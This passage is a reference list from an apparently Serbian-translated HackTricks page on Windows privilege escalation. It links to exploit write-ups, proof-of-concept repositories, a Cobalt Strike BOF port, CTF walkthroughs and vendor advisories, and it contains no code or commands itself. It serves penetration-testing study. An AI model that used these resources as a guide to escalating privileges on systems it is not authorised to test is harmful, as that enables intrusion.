- [3] [Windows - eskalacija privilegija - kratki vodič](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - radionica za lokalnu eskalaciju privilegija u Windows-u / Linux-u](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Napadi na Windows: AT je novi hit (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija - Windows - Kompleksni OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windows-u](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windows-u](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windows-u](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windows-u za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing pomoću Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za Silver Fox: igra mačke i miša u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog sistema datoteka u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih veza – upotreba CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza s prošlošću: zloupotreba simboličkih veza u Windows-u](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js: opasno razrešavanje modula u Windows-u](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Izazovi iz C/C++ kontrolne liste, rešeni](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Otimanje binarnih datoteka servisa](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own uz Microslop: ulančavanje CLDFLT i DirectX uslova utrke u kernelu radi Windows LPE-a](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da njima vlada svima: primitiv za potpuno čitanje/pisanje u Windows-u 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka radi eskalacije privilegija i drugi korisni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - eksploatacioni kod za FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Napadi na WSUS, drugi deo: CVE-2020-1013, jednodnevni exploit za lokalnu eskalaciju privilegija u Windows-u 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: kako promena slike dovodi do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Izdvajanje privatnih SSH ključeva iz Windows 10 SSH agenta](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabrike backdoor-a (0_o) – Prvi deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabrike backdoor-a (0_o) – Drugi deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Eskalacija privilegija brisanjem fascikle Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: vraćanje koracima do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - bezbednosno obaveštenje o eskalaciji privilegija zbog pomeranja u deljenoj memoriji Windows MIDI Services-a](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
